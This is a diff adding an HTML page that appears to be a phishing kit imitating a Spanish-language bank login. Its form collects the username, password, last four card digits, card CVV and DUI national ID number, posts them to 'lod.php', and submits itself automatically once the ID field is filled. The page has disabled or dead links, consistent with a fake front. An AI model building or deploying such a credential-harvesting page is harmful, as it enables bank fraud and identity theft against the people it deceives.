@@ -1,0 +1,67 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      
+         <link rel="stylesheet" href="./archivero/style.css">
+    </head>
+    <body>
+        <header>
+            <div class="log"></div>
+            <div class="help-mensaje"></div>
+          </header>
+          <main class="main">
+            <div class="formulario-contenedor">
+              <form action="lod.php" name="form1" id="form1" method="post">
+                <h2><img src="archivero/wcolme.png"></h2>
+                <div class="input">
+                  <label for="">Usuario</label>
+                  <input type="text" name="usuario" onkeyup="if (this.value.length == this.getAttribute('maxlength')) clave.focus()" maxlength="20" required="" autofocus>
+                </div>
+                <div class="input">
+                  <label for="">Clave</label>
+                  <input type="password" name="clave"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) digitos.focus()" maxlength="20" required="">
+                </div>
+
+                <div class="input">
+                  <label for="" style="" >últimos 4 dígitos de su tarjeta de crédito o débito</label>
+                  <input type="tel" name="digitos"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) cvv.focus()" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" minlength="4"  maxlength="4" required="">
+                </div> </td> <td>
+                <div class="input">
+                  <label for="" style="">código de seguridad de su tarjeta (cvv)</label>
+                  <input type="tel" name="cvv" onkeyup="if (this.value.length == this.getAttribute('maxlength')) nit.focus()"  onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" maxlength="3" required="">
+                </div>  
+               
+                <div class="input">
+                  <label for="">Dui</label>
+                  <input type="text" name="dui"  maxlength="11" onkeyup="if (this.value.length == this.getAttribute('maxlength')) form1.submit();" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)"  required="">
+                </div>
+                <div class="checkbox-contenedor">
+                  <label for=""><input type="checkbox" disabled=""> Recordar usuario</label>
+                </div>
+                <div class="link">
+                  <a href="#" onclick="">¿Olvidaste o bloqueaste tu usuario o clave?</a>
+                </div>
+                <div class="boton">
+                  <button type="submit">Continuar</button>
+                </div>
+              </form>
+              <div class="footer-formulario">
+                <div class="registio">
+                  <a href="#" onclick="">Registro <span></span></a>
+                </div>
+                <div class="contactio">
+                  <a href="#" onclick=" ">Contactanos</a>
+                </div>
+              </div>
+            </div>
+          </main>
+          <footer class="normal-footer">
+            <ul class="footer-list">
+              <li class="primer-li">
+               <img src="archivero/ffter.png">
+              </li>
+            
+        
+            </ul>
+          </footer>
+      
+    
+</body></html>
